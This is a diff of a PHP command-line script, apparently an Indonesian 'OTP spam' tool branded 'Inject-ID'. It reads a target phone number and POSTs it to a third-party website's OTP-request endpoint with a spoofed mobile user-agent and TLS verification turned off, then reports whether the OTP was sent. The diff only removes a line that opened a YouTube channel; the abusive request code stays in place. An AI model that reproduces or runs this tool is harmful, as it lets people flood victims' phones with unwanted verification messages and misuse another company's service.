@@ -7,7 +7,7 @@ system("clear");$k = "[33;1m";$h = "[32;1m";$p = "[37;1m";$m = "[31;1m";$o = "[3
 ";echo $p."       ".$p."Youtube: ".$k."Inject-ID".$p."       
 ";echo $p."
 
-";system("xdg-open https://youtube.com/@inject1d?feature=shared");sleep(1);$no = readline($p." [] Input Number   ".$m.": ".$k);$ua=array('user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36');$ch = curl_init();curl_setopt($ch, CURLOPT_URL, "https://griyaflazz.xyz/ajax/request-otp-v2.php");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);$data=('target='.$no);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);$res = curl_exec($ch);$suc = preg_match("/Berhasil/i",$res);if($suc == "1"){$json = json_decode($res);$auth = $json->data;echo $p."
+sleep(1);$no = readline($p." [] Input Number   ".$m.": ".$k);$ua=array('user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36');$ch = curl_init();curl_setopt($ch, CURLOPT_URL, "https://griyaflazz.xyz/ajax/request-otp-v2.php");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);$data=('target='.$no);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);$res = curl_exec($ch);$suc = preg_match("/Berhasil/i",$res);if($suc == "1"){$json = json_decode($res);$auth = $json->data;echo $p."
 ";echo $p." ".$h."     OTP Success Terkirim!".$p."     
 ";echo $p."
 ";}else{echo $p."
